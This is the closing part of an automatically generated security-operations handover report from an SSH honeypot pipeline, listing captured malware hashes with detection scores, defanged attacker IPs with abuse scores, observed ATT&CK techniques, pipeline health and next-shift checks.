| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `104.248.158[.]38` | SG | DigitalOcean, LLC | **100** ⚠️ | 38 |
| `1.94.220[.]55` | CN | Beijing Teletron Telecom Engineering Co., Ltd. | **100** ⚠️ | 25 |
| `175.213.223[.]121` | KR | Korea Telecom | **100** ⚠️ | 14 |
| `41.242.115[.]83` | GH | DOLPHIN TELECOMMUNICATION LIMITED | **100** ⚠️ | 50 |
| `186.80.18[.]158` | CO | Telmex Colombia S.A. | **100** ⚠️ | 50 |
| `211.47.126[.]146` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 28 |
| `36.134.96[.]76` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `14.103.37[.]34` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `212.88.48[.]17` | GB | Wavenet Limited | **100** ⚠️ | 43 |
| `27.112.78[.]223` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 86 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 42 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 32 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 104 cases |
| Tool 34  | Credential Extractor        | ✅ 74 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 42 priority case(s) shown individually · 15 recon entry/entries in table (5 group(s) consolidating 50 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-08T07:16:07Z_
